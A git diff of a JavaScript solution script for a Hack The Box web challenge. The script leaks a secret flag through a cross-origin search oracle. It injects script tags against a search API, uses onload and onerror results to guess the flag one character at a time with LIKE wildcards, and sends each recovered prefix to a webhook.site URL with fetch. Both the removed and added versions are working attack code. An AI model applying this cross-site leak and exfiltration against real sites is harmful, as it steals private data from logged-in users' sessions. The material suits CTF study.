@@ -1,22 +1,67 @@
-var ip = '188.166.171.200:30840'; // HTB Server IP Address
-var flag = 'Ba'; // init search word
-var letters = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789_';
-var url = 'http://${ip}/api/entries/search?q=';
-async function getLetter(ch){
-  return new Promise((resolve, reject)=>{
-    const script = document.createElement("script");
-    script.src = url+encodeURIComponent(flag+ch);
-    script.onload = () => ch==='}' ? reject(ch):resolve(ch);
-    script.onerror = () => reject(ch);
-    document.head.appendChild(script);
-  });
+//https://github.com/lex1010/blog/blob/b32cb0922026cf81e4b67dbdc99add152049ca31/docs/HTB/Web/abusehumandb.md
+
+var url = "http://188.166.171.200:30840/api/entries/search?q=";
+
+/*
+String that will always contain what we know is definitely in the flag
+HTB{ is our base case as we know this begins the flag
+We build from this base case 
+*/
+var flag = "HTB{";
+
+
+/* 
+Take care with this alphabet, remove "&" and "%" (query params, wildcard)
+and put the underscore at the end as it represents a single character wildcard
+and so should be checked last as otherwise it will always be appended to the flag
+*/
+var a = "{}0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ!$'()*+,-./:;<=>@[]^|_";
+
+
+// Asynchronous as we wish to wait for this to complete before continuing
+// Checks the status code when we query with a specific character
+async function check(char) {
+    return new Promise((resolve, reject) => {
+
+    	// Create a script tag to query the api endpoint with the character via src attribute
+        var s = document.createElement("script");
+        s.src = url+flag+char;
+
+        // onload: 200 => resolve (character is the next in the flag)
+        s.onload = () => {resolve(char);};
+
+        // onerror: 404 => reject (character is invalid)
+        s.onerror = () => {reject(char);};
+
+        document.head.appendChild(s);
+
+    });
 }
-async function getFullWord(letters) {
-  var b = false; var ch;
-  for(var i=0; i < letters.length; i++){
-    await getLetter(letters[i]).then((res) => {flag=flag.concat(res); b = res==='x' ? true:false; i=0} , (res)=> { } );
-    if(b) break;
-  }
-};
-getFullWord(letters);
-console.log(`Flag is ${flag}`);
+
+
+var i = 0;
+async function loop() {
+    while (true) {
+        char = a[i];
+        // Check this character, wait for the result, then depending on its result, do 2 different things:
+        await check(char).then((res) => {
+        	/*
+        	1st: if it was resolved (accepted), append it to the string of known characters
+        	that begin the flag and send this to a webhook that we control
+        	so that we can get also get this information
+        	*/
+            flag += res;
+            fetch("https://webhook.site/3fec1021-2d5a-44ec-a591-8bc65a7157bc?"+flag);
+
+            // Start from the first character again
+            i = 0;
+
+        }, (res) => {
+        	// 2nd: if it was rejected, move onto the next character
+        	i++;
+
+        });
+    }
+}
+
+loop();
